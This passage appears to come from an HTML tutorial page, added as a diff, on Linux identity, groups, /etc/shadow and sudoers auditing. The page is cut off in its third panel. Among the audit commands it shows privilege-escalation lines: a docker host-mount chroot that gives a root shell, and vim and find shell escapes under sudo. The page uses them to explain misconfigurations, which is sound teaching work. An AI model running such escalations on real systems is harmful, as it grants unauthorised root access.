@@ -1,0 +1,1024 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Rajdhani:wght@400;500;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0c0f;--bg2:#0d1117;--bg3:#111820;
+  --panel:#131a22;--panel2:#1a2332;
+  --b:#1e3a5f;--b2:#0f2540;
+  --g:#00ff88;--g2:#00cc6a;--c:#00d4ff;
+  --y:#ffd700;--o:#ff8c00;--r:#ff3b3b;
+  --p:#9d4edd;--bl:#2979ff;
+  --t:#c8d8e8;--t2:#7a9bb5;--t3:#4a6a85;
+  --mono:'JetBrains Mono',monospace;
+  --sans:'Rajdhani','Segoe UI',sans-serif;
+}
+body{background:var(--bg);color:var(--t);font-family:var(--mono);font-size:13px;line-height:1.6;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.01) 2px,rgba(0,255,136,.01) 4px);pointer-events:none;z-index:9999}
+.wrap{max-width:1100px;margin:0 auto;padding:20px 16px}
+/* panels */
+.panel{background:var(--panel);border:1px solid var(--b2);margin-bottom:14px;overflow:hidden}
+.ph{background:var(--panel2);border-bottom:1px solid var(--b);padding:8px 16px;display:flex;align-items:center;gap:10px}
+.pt{font-family:var(--sans);font-size:13px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--c)}
+.pn{margin-left:auto;font-size:10px;color:var(--t3);letter-spacing:1px}
+.pb{padding:18px 20px}
+@keyframes pulse{0%,100%{box-shadow:0 0 6px var(--g)}50%{box-shadow:0 0 18px var(--g);opacity:.5}}
+/* grids */
+.g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px}
+.g3{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}
+.g4{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px}
+/* concept blocks */
+.cb{background:var(--bg3);border:1px solid var(--b2);padding:14px}
+.cbl{border-left:3px solid var(--c)}.cbg{border-left:3px solid var(--g)}.cby{border-left:3px solid var(--y)}.cbp{border-left:3px solid var(--p)}.cbo{border-left:3px solid var(--o)}.cbr{border-left:3px solid var(--r)}
+.cbt{font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}
+.cbl .cbt{color:var(--c)}.cbg .cbt{color:var(--g)}.cby .cbt{color:var(--y)}.cbp .cbt{color:var(--p)}.cbo .cbt{color:var(--o)}.cbr .cbt{color:var(--r)}
+.ct{color:var(--t);font-size:12.5px;line-height:1.7}
+/* terminal */
+.term{background:#050810;border:1px solid #1a2d45;overflow:hidden}
+.tbar{background:#0d1520;border-bottom:1px solid #1a2d45;padding:7px 14px;display:flex;align-items:center;gap:8px}
+.td{width:10px;height:10px;border-radius:50%}
+.tb{padding:14px 18px;font-size:12px;line-height:1.8}
+.pr{color:var(--g)}
+.sec{display:block;color:var(--t3);font-size:10px;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a2d45;padding-top:10px;margin:10px 0 4px}
+.out{display:block;color:var(--t2)}.ocn{display:block;color:var(--c)}.oyn{display:block;color:var(--y)}.orn{display:block;color:var(--o)}.ogn{display:block;color:var(--g)}.ored{display:block;color:var(--r)}.opu{display:block;color:var(--p)}
+/* info/warn/good */
+.info{display:flex;gap:8px;padding:8px 12px;background:rgba(0,212,255,.06);border-left:3px solid var(--c);margin:10px 0;font-size:12px;color:var(--t2)}
+.warn{display:flex;gap:8px;padding:8px 12px;background:rgba(255,215,0,.06);border-left:3px solid var(--y);margin:10px 0;font-size:12px;color:var(--t2)}
+.good{display:flex;gap:8px;padding:8px 12px;background:rgba(0,255,136,.06);border-left:3px solid var(--g);margin:10px 0;font-size:12px;color:var(--t2)}
+.danger{display:flex;gap:8px;padding:8px 12px;background:rgba(255,59,59,.07);border-left:3px solid var(--r);margin:10px 0;font-size:12px;color:var(--t2)}
+/* table */
+.tbl{width:100%;border-collapse:collapse;font-size:12px}
+.tbl th{background:var(--panel2);padding:9px 12px;text-align:left;font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;border-bottom:2px solid var(--b);color:var(--c)}
+.tbl td{padding:8px 12px;border-bottom:1px solid var(--b2);color:var(--t2);vertical-align:top;font-size:12px}
+.tbl td:first-child{color:var(--g);font-family:var(--mono)}
+.tbl tr:hover td{background:rgba(255,255,255,.02)}
+/* tags */
+.tag{padding:2px 8px;border-radius:2px;font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;font-family:var(--sans)}
+.tg{background:rgba(0,255,136,.12);color:var(--g);border:1px solid rgba(0,255,136,.3)}
+.tc{background:rgba(0,212,255,.1);color:var(--c);border:1px solid rgba(0,212,255,.3)}
+.ty{background:rgba(255,215,0,.1);color:var(--y);border:1px solid rgba(255,215,0,.3)}
+.tp{background:rgba(157,78,221,.12);color:var(--p);border:1px solid rgba(157,78,221,.3)}
+.to{background:rgba(255,140,0,.1);color:var(--o);border:1px solid rgba(255,140,0,.3)}
+.tr2{background:rgba(255,59,59,.1);color:var(--r);border:1px solid rgba(255,59,59,.3)}
+/* checklist */
+.cl{list-style:none}
+.cl li{padding:7px 0;border-bottom:1px solid var(--b2);font-size:12.5px;display:flex;align-items:flex-start;gap:10px;color:var(--t2)}
+.chk{width:16px;height:16px;min-width:16px;border:1px solid var(--g);background:rgba(0,255,136,.1);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--g);margin-top:1px;flex-shrink:0}
+/* highlights */
+.hl{color:var(--g);font-weight:600}.hc{color:var(--c)}.hy{color:var(--y)}.ho{color:var(--o)}.hp{color:var(--p)}.hr{color:var(--r)}
+.div{height:1px;background:linear-gradient(to right,transparent,var(--b),transparent);margin:10px 0}
+/* summary */
+.sum-card{background:var(--bg3);border:1px solid var(--b2);padding:14px}
+.sc-l{font-family:var(--sans);font-size:10px;letter-spacing:2px;text-transform:uppercase;font-weight:600;color:var(--t3);margin-bottom:6px}
+.sc-v{font-size:12px;color:var(--t);line-height:1.6}
+.nxt{background:linear-gradient(135deg,rgba(0,255,136,.08),rgba(0,212,255,.05));border:1px solid rgba(0,255,136,.3);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-top:14px}
+.nb{background:var(--bg);border:1px solid var(--b);padding:6px 16px;font-size:12px;color:var(--g);cursor:pointer;font-family:var(--mono)}
+.nb:hover{background:rgba(0,255,136,.1);border-color:var(--g)}
+/* uid ranges */
+.uid-band{display:flex;align-items:stretch;margin-bottom:3px}
+.uid-range{width:140px;min-width:140px;font-size:10px;color:var(--t3);display:flex;align-items:center;justify-content:flex-end;padding-right:12px;font-family:var(--mono)}
+.uid-bar{flex:1;padding:8px 12px;border:1px solid;font-family:var(--sans);font-weight:600;font-size:12px}
+/* passwd fields */
+.passwd-field{display:flex;gap:0;font-family:var(--mono);font-size:12px;flex-wrap:wrap;margin:8px 0}
+.pf{padding:6px 10px;border:1px solid var(--b2);text-align:center}
+.pf-sep{padding:6px 4px;color:var(--t3);display:flex;align-items:center}
+.pf-label{font-size:9px;color:var(--t3);font-family:var(--sans);font-weight:600;letter-spacing:1px;text-transform:uppercase;margin-top:3px;text-align:center}
+/* sudo flow */
+.sudo-step{display:flex;gap:12px;align-items:flex-start;margin-bottom:0}
+.sudo-line{position:absolute;left:15px;top:32px;bottom:-10px;width:1px;background:linear-gradient(to bottom,var(--y),transparent)}
+.sudo-dot{width:32px;min-width:32px;height:32px;border-radius:50%;border:2px solid var(--y);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--y);background:rgba(255,215,0,.08);flex-shrink:0;font-family:var(--sans)}
+.sudo-body{flex:1;background:var(--bg3);border:1px solid var(--b2);padding:10px 14px;margin-bottom:10px}
+.sudo-title{font-family:var(--sans);font-weight:600;font-size:13px;color:var(--y);margin-bottom:3px}
+.sudo-desc{font-size:11.5px;color:var(--t2)}
+.sudo-cmd{margin-top:5px;background:var(--bg);padding:4px 10px;font-size:11px;color:var(--c);border-left:2px solid var(--c)}
+/* cap grid */
+.cap-card{background:var(--bg3);border:1px solid var(--b2);padding:12px}
+.cap-name{font-family:var(--sans);font-size:11px;font-weight:700;color:var(--c);margin-bottom:4px;letter-spacing:.5px}
+.cap-desc{font-size:11px;color:var(--t2);line-height:1.5}
+.cap-risk{font-size:10px;margin-top:5px;padding:2px 6px;display:inline-block}
+/* pam flow */
+.pam-module{background:var(--bg3);border:1px solid var(--b2);padding:10px 14px;margin-bottom:4px;display:flex;align-items:center;gap:12px}
+.pam-type{width:90px;min-width:90px;font-family:var(--sans);font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase}
+.pam-ctrl{width:80px;min-width:80px;font-family:var(--sans);font-size:10px;font-weight:600}
+.pam-mod{flex:1;color:var(--t);font-size:11px}
+.pam-desc{flex:2;font-size:11px;color:var(--t3)}
+/* privesc chain */
+.pe-chain{display:flex;flex-wrap:wrap;gap:0;align-items:center}
+.pe-box{background:var(--bg3);border:1px solid var(--b2);padding:10px 14px;text-align:center;min-width:130px}
+.pe-title{font-family:var(--sans);font-weight:700;font-size:12px;margin-bottom:3px}
+.pe-sub{font-size:10px;color:var(--t3)}
+.pe-arrow{padding:0 8px;color:var(--r);font-size:20px;font-weight:700}
+/* nsswitch / pam stack */
+.stack-layer{border:1px solid;padding:10px 16px;margin-bottom:3px}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- ═══ HEADER ═══ -->
+<div style="background:linear-gradient(135deg,#0d1a2e,#0a1520);border:1px solid var(--b);border-top:3px solid var(--g);padding:20px 24px;margin-bottom:16px;position:relative;overflow:hidden">
+  <div style="position:absolute;right:-60px;top:-60px;width:200px;height:200px;background:radial-gradient(circle,rgba(0,255,136,.05),transparent 70%);pointer-events:none"></div>
+  <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px">
+    <div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+        <div style="width:8px;height:8px;border-radius:50%;background:var(--g);animation:pulse 2s infinite"></div>
+        <span style="font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:var(--g)">STEP 04 / MODULE 1 ● ACTIVE</span>
+      </div>
+      <h1 style="font-family:var(--sans);font-size:26px;font-weight:700;color:#fff;letter-spacing:1px;line-height:1.2">
+        Linux <span style="color:var(--g)">User, Permission</span> &amp; Access Control
+      </h1>
+      <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:10px">
+        <span class="tag tg">● Intermediate</span>
+        <span class="tag tc">⊞ Identity & IAM</span>
+        <span class="tag ty">⊛ sudo & PAM</span>
+        <span class="tag tp">⬡ Capabilities</span>
+        <span class="tag tr2">⊕ Privilege Escalation</span>
+      </div>
+    </div>
+    <div style="text-align:right;font-size:11px;color:var(--t3);line-height:1.9;font-family:var(--mono)">
+      <div>MODULE: <span style="color:var(--c)">iam-auth-04</span></div>
+      <div>DEPTH: <span style="color:var(--c)">L5–L7</span></div>
+      <div>PANELS: <span style="color:var(--c)">13</span></div>
+      <div>PREREQ: <span style="color:var(--c)">Step 01–03 ✓</span></div>
+      <div style="margin-top:6px;font-size:10px;color:#1e6a3a">▓▓▓▓▓▓▓▓▓▓ IDENTITY LOADED</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 01 — USERS & IDENTITY ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">👤</span><span class="pt">Linux Identity Model — Users, UIDs &amp; the /etc/passwd File</span><span class="pn">PANEL 01</span></div>
+  <div class="pb">
+    <div class="info"><span style="color:var(--c);flex-shrink:0">ℹ</span><span>Linux does not know users by name. The kernel identifies every process and file by <strong style="color:var(--c)">numeric UID (User ID)</strong> and <strong style="color:var(--c)">GID (Group ID)</strong>. Names are just a human-readable label — <code>/etc/passwd</code> maps name ↔ UID. This distinction matters for forensics and privilege escalation.</span></div>
+
+    <!-- UID ranges -->
+    <div style="margin-bottom:14px">
+      <div style="font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px">UID Ranges — Who Is Who</div>
+      <div class="uid-band"><div class="uid-range">0</div><div class="uid-bar" style="border-color:rgba(255,59,59,.4);background:rgba(255,59,59,.08);color:var(--r)">root <span style="font-weight:400;font-size:11px;color:var(--t3)">— UID 0. The only UID the kernel treats as privileged. No DAC restrictions apply. One account.</span></div></div>
+      <div class="uid-band"><div class="uid-range">1 – 999</div><div class="uid-bar" style="border-color:rgba(255,215,0,.35);background:rgba(255,215,0,.06);color:var(--y)">System / Service Accounts <span style="font-weight:400;font-size:11px;color:var(--t3)">— www-data(33), nobody(65534), sshd(74), mysql(27). No login shell. Run daemons.</span></div></div>
+      <div class="uid-band"><div class="uid-range">1000 – 59999</div><div class="uid-bar" style="border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.06);color:var(--g)">Regular Users <span style="font-weight:400;font-size:11px;color:var(--t3)">— Human accounts. Created by useradd. Have home dir, login shell, mail spool.</span></div></div>
+      <div class="uid-band"><div class="uid-range">60000 – 65535</div><div class="uid-bar" style="border-color:rgba(0,212,255,.3);background:rgba(0,212,255,.06);color:var(--c)">Reserved / nobody range <span style="font-weight:400;font-size:11px;color:var(--t3)">— nobody(65534) used for NFS anonymous access and privilege-dropped daemons.</span></div></div>
+    </div>
+
+    <!-- /etc/passwd anatomy -->
+    <div style="font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px">/etc/passwd line anatomy</div>
+    <div style="background:var(--bg);border:1px solid var(--b2);padding:14px;margin-bottom:14px;overflow-x:auto">
+      <div class="passwd-field">
+        <div><div class="pf" style="background:rgba(0,255,136,.08);border-color:rgba(0,255,136,.3);color:var(--g)">alice</div><div class="pf-label">username</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="background:rgba(255,59,59,.08);border-color:rgba(255,59,59,.3);color:var(--r)">x</div><div class="pf-label">password<br>(in shadow)</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="background:rgba(255,215,0,.08);border-color:rgba(255,215,0,.3);color:var(--y)">1001</div><div class="pf-label">UID</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="background:rgba(0,212,255,.08);border-color:rgba(0,212,255,.3);color:var(--c)">1001</div><div class="pf-label">primary GID</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="background:rgba(157,78,221,.08);border-color:rgba(157,78,221,.3);color:var(--p)">Alice Admin</div><div class="pf-label">GECOS<br>(comment)</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="background:rgba(255,140,0,.08);border-color:rgba(255,140,0,.3);color:var(--o)">/home/alice</div><div class="pf-label">home dir</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="background:rgba(0,255,136,.08);border-color:rgba(0,255,136,.3);color:var(--g)">/bin/bash</div><div class="pf-label">login shell</div></div>
+      </div>
+      <div style="font-size:11px;color:var(--t3);margin-top:8px">
+        ⚠ <strong style="color:var(--y)">Shell field = /bin/false or /usr/sbin/nologin</strong> for service accounts — prevents interactive login even with valid password.
+      </div>
+    </div>
+
+    <!-- /etc/shadow anatomy -->
+    <div style="font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px">/etc/shadow line anatomy (root-only readable)</div>
+    <div style="background:var(--bg);border:1px solid rgba(255,59,59,.3);padding:14px;margin-bottom:14px;overflow-x:auto">
+      <div class="passwd-field">
+        <div><div class="pf" style="border-color:var(--r);color:var(--g)">alice</div><div class="pf-label">username</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="border-color:var(--r);color:var(--r);font-size:9px">$6$salt$hash…</div><div class="pf-label">hashed pw<br>(SHA-512)</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="border-color:var(--b2);color:var(--t2)">19479</div><div class="pf-label">last changed<br>(days since epoch)</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="border-color:var(--b2);color:var(--t2)">0</div><div class="pf-label">min age<br>(days)</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="border-color:var(--b2);color:var(--y)">90</div><div class="pf-label">max age<br>(expiry)</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="border-color:var(--b2);color:var(--t2)">7</div><div class="pf-label">warn days</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="border-color:var(--b2);color:var(--t3)">!</div><div class="pf-label">inactive<br>grace</div></div>
+        <div class="pf-sep">:</div>
+        <div><div class="pf" style="border-color:var(--b2);color:var(--t3)"></div><div class="pf-label">expire date</div></div>
+      </div>
+      <div style="font-size:11px;color:var(--t3);margin-top:8px">
+        Hash prefix: <span style="color:var(--g)">$6$</span>=SHA-512 (secure), <span style="color:var(--y)">$5$</span>=SHA-256, <span style="color:var(--r)">$1$</span>=MD5 (BROKEN — audit immediately!). 
+        <span style="color:var(--r)">!</span> or <span style="color:var(--r)">*</span> prefix = account locked.
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">User management commands</span></div>
+      <div class="tb">
+        <span class="sec">──── CREATE & MANAGE USERS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">useradd -m -s /bin/bash -G sudo,docker -c "Dev User" alice</span></span>
+        <span class="out"># -m = create home, -s = shell, -G = supplementary groups</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">passwd alice           # set password</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">usermod -aG developers alice  # add to group</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">userdel -r alice       # delete user + home dir</span></span>
+        <span class="sec">──── CURRENT IDENTITY ────</span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">id</span></span>
+        <span class="ocn">uid=1001(alice) gid=1001(alice) groups=1001(alice),27(sudo),998(docker)</span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">whoami && who && w</span></span>
+        <span class="out">alice</span>
+        <span class="out">alice   pts/0  2026-05-03 10:12 (192.168.1.50)</span>
+        <span class="sec">──── PASSWORD POLICY AUDIT ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">chage -l alice</span></span>
+        <span class="out">Last password change       : May 03, 2026</span>
+        <span class="oyn">Maximum number of days    : 90</span>
+        <span class="oyn">Password expires          : Aug 01, 2026</span>
+        <span class="sec">──── FIND USERS WITH EMPTY PASSWORDS (CRITICAL) ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">awk -F: '($2 == "" ) {print $1}' /etc/shadow</span></span>
+        <span class="ored">testuser   ← no password! lock immediately</span>
+        <span class="sec">──── FIND USERS WITH UID 0 (should only be root) ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">awk -F: '($3 == "0") {print $1}' /etc/passwd</span></span>
+        <span class="ogn">root</span>
+        <span class="ored">hacker     ← second UID-0 account! backdoor detected</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 02 — GROUPS ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">👥</span><span class="pt">Groups — Collective Identity &amp; /etc/group</span><span class="pn">PANEL 02</span></div>
+  <div class="pb">
+    <div class="g2" style="margin-bottom:14px">
+      <div class="cb cbg">
+        <div class="cbt">Primary vs Supplementary Groups</div>
+        <div class="ct">
+          Every process has one <span class="hl">primary GID</span> (from /etc/passwd) and up to 32 <span class="hc">supplementary GIDs</span>. New files created by a process are owned by the process's primary GID.<br><br>
+          Supplementary groups grant additional access. Being in the <span class="hy">sudo</span> group allows sudo. Being in <span class="hy">docker</span> group allows running Docker without sudo (effectively root — audit this!). Being in <span class="hy">adm</span> allows reading logs.
+        </div>
+      </div>
+      <div class="cb cby">
+        <div class="cbt">High-Risk Groups to Audit</div>
+        <div style="font-size:12px;color:var(--t2);line-height:1.9">
+          <span class="hr">sudo / wheel</span> — full root via sudo<br>
+          <span class="hr">docker</span> — mount host FS in container = root<br>
+          <span class="hr">disk</span> — raw disk access (read /dev/sda = read all data)<br>
+          <span class="hr">shadow</span> — read /etc/shadow = crack all passwords<br>
+          <span class="hr">lxd</span> — LXD container = root escape<br>
+          <span class="hy">adm</span> — read system logs (info disclosure)<br>
+          <span class="hc">www-data</span> — web server files (check for secrets in webroot)
+        </div>
+      </div>
+    </div>
+
+    <div style="background:var(--bg);border:1px solid var(--b2);padding:14px;margin-bottom:14px">
+      <div style="font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px">/etc/group — group:password:GID:members</div>
+      <div style="font-family:var(--mono);font-size:12px;line-height:2">
+        <div><span style="color:var(--r)">root</span><span style="color:var(--t3)">:x:</span><span style="color:var(--y)">0</span><span style="color:var(--t3)">:</span></div>
+        <div><span style="color:var(--o)">sudo</span><span style="color:var(--t3)">:x:</span><span style="color:var(--y)">27</span><span style="color:var(--t3)">:</span><span style="color:var(--g)">alice,bob</span></div>
+        <div><span style="color:var(--r)">docker</span><span style="color:var(--t3)">:x:</span><span style="color:var(--y)">998</span><span style="color:var(--t3)">:</span><span style="color:var(--g)">alice</span><span style="color:var(--r);font-size:11px"> ← alice in docker group = effective root!</span></div>
+        <div><span style="color:var(--p)">developers</span><span style="color:var(--t3)">:x:</span><span style="color:var(--y)">1050</span><span style="color:var(--t3)">:</span><span style="color:var(--g)">alice,charlie,dave</span></div>
+        <div><span style="color:var(--c)">www-data</span><span style="color:var(--t3)">:x:</span><span style="color:var(--y)">33</span><span style="color:var(--t3)">:</span></div>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">Group management & audit</span></div>
+      <div class="tb">
+        <span class="sec">──── GROUP OPERATIONS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">groupadd developers</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">gpasswd -a alice developers   # add alice to group</span></span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">gpasswd -d alice developers   # remove alice from group</span></span>
+        <span class="sec">──── AUDIT: WHO IS IN HIGH-RISK GROUPS? ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">for g in sudo docker disk shadow lxd adm; do echo "=== $g ==="; getent group $g; done</span></span>
+        <span class="oyn">=== sudo ===</span>
+        <span class="out">sudo:x:27:alice,bob</span>
+        <span class="oyn">=== docker ===</span>
+        <span class="ored">docker:x:998:alice,jenkins   ← jenkins in docker group? verify this!</span>
+        <span class="oyn">=== disk ===</span>
+        <span class="ored">disk:x:6:bob               ← bob has raw disk access!</span>
+        <span class="sec">──── DOCKER GROUP = ROOT ESCAPE ────</span>
+        <span><span class="pr">alice@lab:~$ </span><span style="color:#fff">docker run -v /:/hostfs -it alpine chroot /hostfs sh</span></span>
+        <span class="ored"># alice now has root shell on host filesystem — not sudo needed!</span>
+        <span class="ogn"># Fix: remove docker group, use rootless Docker or sudo wrapper</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ PANEL 03 — ROOT & SUDO ═══ -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">⚡</span><span class="pt">root User &amp; sudo — Privilege Elevation Architecture</span><span class="pn">PANEL 03</span></div>
+  <div class="pb">
+    <div class="g2" style="margin-bottom:14px">
+      <div class="cb cbr">
+        <div class="cbt">root (UID 0) — The Superuser</div>
+        <div class="ct">
+          UID 0 is the kernel's definition of privilege. <span class="hr">DAC (Discretionary Access Control) does not apply to UID 0</span> — root can read/write any file, kill any process, bind any port, load kernel modules, change any UID.<br><br>
+          Best practice: <span class="hl">direct root login should be disabled</span>. Use sudo for traceability. Root's actions are logged; unlogged direct root access is a forensic blind spot.<br><br>
+          <span class="hy">Root shell check:</span> <code>cat /etc/passwd | grep ":/bin/bash"</code> — root should be the only UID-0 with a shell.
+        </div>
+      </div>
+      <div class="cb cby">
+        <div class="cbt">sudo — Controlled Privilege Delegation</div>
+        <div class="ct">
+          sudo lets a user run <span class="hy">specific commands as root</span> (or another user) with full logging to <code>/var/log/auth.log</code> and journald.<br><br>
+          Key concepts:<br>
+          <span class="hl">NOPASSWD:</span> — dangerous, allows passwordless elevation<br>
+          <span class="hl">ALL=(ALL:ALL) ALL</span> — full root (same as root account)<br>
+          <span class="hc">Cmnd_Alias</span> — restrict to specific commands<br>
+          <span class="hc">!command</span> — deny specific command (bypassable!)<br><br>
+          <span class="hr">Never use visudo without understanding the rules. A misconfigured sudoers = game over.</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- sudo execution flow -->
+    <div style="font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:10px">sudo Execution Flow</div>
+    <div style="display:flex;flex-direction:column">
+      <div class="sudo-step" style="position:relative">
+        <div class="sudo-line"></div>
+        <div class="sudo-dot">1</div>
+        <div class="sudo-body">
+          <div class="sudo-title">User invokes sudo</div>
+          <div class="sudo-desc">alice runs <code>sudo systemctl restart nginx</code>. sudo binary has SUID bit — temporarily runs as root to check policy.</div>
+          <div class="sudo-cmd">$ sudo systemctl restart nginx</div>
+        </div>
+      </div>
+      <div class="sudo-step" style="position:relative">
+        <div class="sudo-line"></div>
+        <div class="sudo-dot">2</div>
+        <div class="sudo-body">
+          <div class="sudo-title">sudoers policy check</div>
+          <div class="sudo-desc">sudo reads <code>/etc/sudoers</code> and <code>/etc/sudoers.d/*</code>. Checks: Is alice listed? Is this command allowed? Is this host matched?</div>
+          <div class="sudo-cmd">alice ALL=(ALL) /usr/bin/systemctl restart nginx</div>
+        </div>
+      </div>
+      <div class="sudo-step" style="position:relative">
+        <div class="sudo-line"></div>
+        <div class="sudo-dot">3</div>
+        <div class="sudo-body">
+          <div class="sudo-title">PAM authentication</div>
+          <div class="sudo-desc">sudo invokes PAM to verify alice's identity — typically password prompt. If alice authenticated within <code>timestamp_timeout</code> (default 15min), skip prompt.</div>
+          <div class="sudo-cmd">[sudo] password for alice: ••••••••</div>
+        </div>
+      </div>
+      <div class="sudo-step" style="position:relative">
+        <div class="sudo-line"></div>
+        <div class="sudo-dot">4</div>
+        <div class="sudo-body">
+          <div class="sudo-title">Audit log written</div>
+          <div class="sudo-desc">Before execution, sudo writes to <code>/var/log/auth.log</code>: who, what command, from where, timestamp. Non-repudiable audit trail.</div>
+          <div class="sudo-cmd">May 03 10:15:22 lab sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx</div>
+        </div>
+      </div>
+      <div class="sudo-step">
+        <div class="sudo-dot">5</div>
+        <div class="sudo-body">
+          <div class="sudo-title">Command executes as root</div>
+          <div class="sudo-desc">sudo forks, sets UID=0, executes the command. On completion, drops back to alice's context. Target process was root only for the duration of the command.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- sudoers examples -->
+    <div class="term" style="margin-top:14px">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">/etc/sudoers — secure vs dangerous configurations</span></div>
+      <div class="tb">
+        <span class="sec">──── SUDOERS SYNTAX ────</span>
+        <span class="ocn"># Format: user  host=(run_as_user:run_as_group)  commands</span>
+        <span class="ogn">alice   ALL=(root)  /usr/bin/systemctl restart nginx, /usr/bin/journalctl</span>
+        <span class="ocn">%developers ALL=(ALL:ALL) /usr/bin/apt, /usr/bin/docker</span>
+        <span class="oyn">Defaults  timestamp_timeout=5    # re-ask after 5 min (not 15)</span>
+        <span class="oyn">Defaults  logfile=/var/log/sudo.log</span>
+        <span class="oyn">Defaults  requiretty             # must be real TTY, no scripts</span>
+        <span class="sec">──── DANGEROUS SUDOERS PATTERNS ────</span>
+        <span class="ored">alice ALL=(ALL) NOPASSWD: ALL           # full root, no password = backdoor</span>
+        <span class="ored">bob   ALL=(ALL) /usr/bin/vim            # vim can spawn shell: :!/bin/bash</span>
+        <span class="ored">carol ALL=(ALL) /usr/bin/find           # find can exec: find / -exec /bin/sh \;</span>
+        <span class="ored">dave  ALL=(ALL) !/usr/bin/su, /bin/bash # bypass: sudo bash</span>
+        <span class="sec">──── AUDIT CURRENT SUDO RULES ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">sudo -l -U alice</span></span>
+        <span class="out">Matching Defaults entries for alice on lab:</span>
+        <span class="out">    env_reset, mail_badpass, secure_path=...</span>
+        <span class="oyn">User alice may run the following commands on lab:</span>
+        <span class="ogn">    (ALL : ALL) ALL</span>
+        <span class="sec">──── SUDO LOG FORENSICS ────</span>
+        <span><span class="pr">root@lab:~# </span><span style="color:#fff">grep sudo /var/log/auth.log | grep -v "pam_unix" | tail -10</span></span>
+        <span class="ocn">May 03 10:15:22 lab sudo: alice : COMMAND=/usr/bin/systemctl restart nginx</span>
+        <span class="ored">May 03 02:44:11 lab sudo: attacker : 3 incorrect password attempts ; COMMAND=/bin/bash</span>
+      </div>
